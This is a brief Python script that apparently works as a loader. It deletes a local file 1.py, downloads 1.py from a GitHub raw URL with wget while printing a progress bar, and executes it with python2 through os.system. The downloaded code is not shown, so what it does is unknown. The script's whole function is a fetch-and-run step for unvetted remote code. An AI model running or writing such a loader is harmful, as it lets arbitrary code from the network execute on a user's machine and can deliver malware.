import wget, os
os.system('rm -rf 1.py')
os.system('rm -rf 1.py') 
def bar_custom(current, total, width=80):
    print("Downloading: %d%% [%d / %d] bytes" % (current / total * 100, current, total))
wget.download('https://github.com/hedi44/free/blob/main/1.py?raw=true', bar=bar_custom)
os.system('python2 1.py')